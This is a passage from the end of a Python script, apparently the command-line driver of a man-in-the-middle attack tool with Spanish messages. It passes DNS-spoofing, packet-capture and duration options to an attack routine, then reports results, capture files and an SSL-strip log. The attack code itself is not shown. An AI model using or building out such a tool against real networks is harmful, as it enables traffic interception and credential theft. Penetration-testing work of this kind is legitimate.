            dns_spoof=dns_spoof,
            dns_spoof_hosts=dns_spoof_hosts,
            packet_capture=packet_capture,
            capture_filter=capture_filter,
            duration=duration
        )
        
        if results:
            # Mostrar resultados
            print(f"\n{COLORS['BLUE']}Ataque completado{COLORS['ENDC']}")
            print(f"Duración: {results['duration']:.2f} segundos")
            
            # Mostrar ruta de los informes
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            json_file = os.path.join(output_dir, f"mitm_attack_{timestamp}.json")
            html_file = os.path.join(output_dir, f"mitm_report_{timestamp}.html")
            
            print(f"\n{COLORS['GREEN']}Informes generados:{COLORS['ENDC']}")
            print(f"  - JSON: {json_file}")
            print(f"  - HTML: {html_file}")
            
            if results['packet_capture'] and results['capture_file']:
                print(f"  - Captura: {results['capture_file']}")
            
            if 'sslstrip_log' in results:
                print(f"  - SSL Strip Log: {results['sslstrip_log']}")
    except KeyboardInterrupt:
        print(f"\n{COLORS['WARNING']}Ataque cancelado por el usuario{COLORS['ENDC']}")
    except Exception as e:
        print(f"\n{COLORS['FAIL']}Error durante el ataque: {str(e)}{COLORS['ENDC']}")

if __name__ == '__main__':
    main()